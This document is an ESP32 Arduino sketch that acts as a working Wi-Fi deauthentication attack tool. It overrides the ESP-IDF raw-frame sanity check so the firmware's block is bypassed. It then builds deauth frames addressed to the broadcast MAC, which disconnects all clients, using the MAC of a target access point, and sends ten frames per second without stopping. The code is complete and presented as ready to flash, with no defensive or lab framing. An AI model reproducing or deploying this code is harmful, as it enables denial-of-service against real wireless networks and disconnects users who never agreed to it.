#include <WiFi.h>
#include <esp_wifi.h>

// --- BYPASS FUNCTION ---
// Overrides the ESP-IDF internal sanity check to allow sending deauth/disassoc frames.
// Remember to add `-zmuldefs` to the linker flags in platform.txt to avoid duplicate definition errors.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; // Always return 0 (Success)
}

// Configuration
const int TARGET_CHANNEL = 1; // Must match the target AP's channel

// Target AP and Client MAC addresses (Replace with your targets)
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast (disconnects all clients)
uint8_t ap_mac[6]     = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; // Replace with Access Point MAC

// Deauthentication Frame Template
uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth subtype (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (Receiver) - Will be overwritten
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // Source MAC (Transmitter) - Will be overwritten
    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, // BSSID - Will be overwritten
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason Code: 7 (Class 3 frame received from nonassociated STA)
};

void send_deauth() {
    // Populate the frame template with our target and AP MAC addresses
    memcpy(&deauth_frame[4], target_mac, 6);
    memcpy(&deauth_frame[10], ap_mac, 6);
    memcpy(&deauth_frame[16], ap_mac, 6);

    // Transmit the raw frame using ESP-IDF API
    // WIFI_IF_STA specifies sending on the station interface
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    
    if (result == ESP_OK) {
        Serial.println("Deauth frame sent successfully!");
    } else {
        Serial.printf("Failed to send frame, error code: %d\n", result);
    }
}

void setup() {
    Serial.begin(115200);
    delay(2000); // Wait for serial to initialize
    Serial.println("\nStarting Deauth Bypass Example...");

    // Initialize WiFi in Station mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // Set the WiFi channel (Crucial: frames will only be received if on the correct channel)
    esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
    
    Serial.printf("WiFi initialized on channel %d. Ready to send frames.\n", TARGET_CHANNEL);
}

void loop() {
    send_deauth();
    delay(100); // Send 10 packets per second (adjust as needed)
}
